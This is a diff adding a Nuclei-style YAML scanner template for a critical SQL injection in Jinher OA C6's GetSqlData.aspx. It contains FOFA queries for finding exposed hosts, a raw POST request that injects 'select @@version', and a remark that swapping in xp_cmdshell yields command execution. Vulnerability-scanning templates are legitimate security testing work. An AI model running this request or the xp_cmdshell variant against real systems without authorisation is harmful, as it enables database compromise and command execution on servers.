@@ -1,0 +1,32 @@
+id: jinher-c6-getsqldata-sqli
+
+info:
+  name: 金和 OA C6-GetSqlData.aspx SQL注入
+  author: SleepingBag945
+  severity: critical
+  description: |
+    FOFA: app="金和网络-金和OA" 
+    FOFA: body="src=\"/c6/WebResource.axd"
+    利用直接修改sql语句为 exec master..xp_cmdshell 'ipconfig'
+  tags: jinher,sqli
+
+http:
+  - raw:
+      - |
+        POST /C6/Control/GetSqlData.aspx/.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        select @@version
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: status_code
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 'SQL'
+        condition: and
